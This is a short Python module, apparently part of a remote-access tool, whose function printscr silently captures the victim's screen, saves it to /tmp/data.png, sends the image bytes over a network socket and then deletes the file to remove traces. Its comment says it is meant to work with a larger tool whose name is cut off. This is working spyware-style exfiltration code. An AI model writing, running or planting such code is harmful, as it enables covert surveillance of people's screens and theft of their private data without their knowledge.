import pyscreenshot as ImageGrab
import os

#Script to take screenshot, to work with the ange

def printscr(s,host,port):
	img=ImageGrab.grab() 
	savedir="/tmp/"
	save_as = os.path.join(savedir, 'data.png')
	img.save(save_as)
	image = open(os.path.join(save_as), "rb")
	image_data = image.read()
	image.close()
	header = ""
	header_bytes = bytes(header, "utf-8")
	s.sendall(header_bytes + image_data)
	os.system("rm /tmp/data.png")
	
	

